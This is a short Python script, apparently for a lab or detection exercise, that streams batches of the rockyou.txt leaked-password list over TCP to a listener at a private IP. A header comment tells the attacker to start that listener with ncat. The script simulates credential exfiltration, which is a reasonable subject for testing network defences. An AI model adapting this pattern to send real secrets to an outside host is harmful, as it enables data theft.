# ON THE ATTACKER RUN ncat -l -k -p 8080

import socket
import random
import time

def send_single_message(server_ip, port, message):
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the server
        s.connect((server_ip, port))

        # Send the message
        s.sendall(message.encode())

        # Close the connection immediately after sending
        s.close()

    except Exception as e:
        print(f"Error: {e}")

# Configuration
server_ip = "172.28.219.62"
port = 8080

with open('rockyou.txt') as r:
    while True:
        passwords = ''
        for _ in range(random.randint(1,5)):
            try:
                line = r.readline()
                passwords += line.strip() + ','
            except:
                passwords += 'utf8err,'

        send_single_message(server_ip, port, passwords)
        print(f'Sent {passwords}')
        time.sleep(0.1)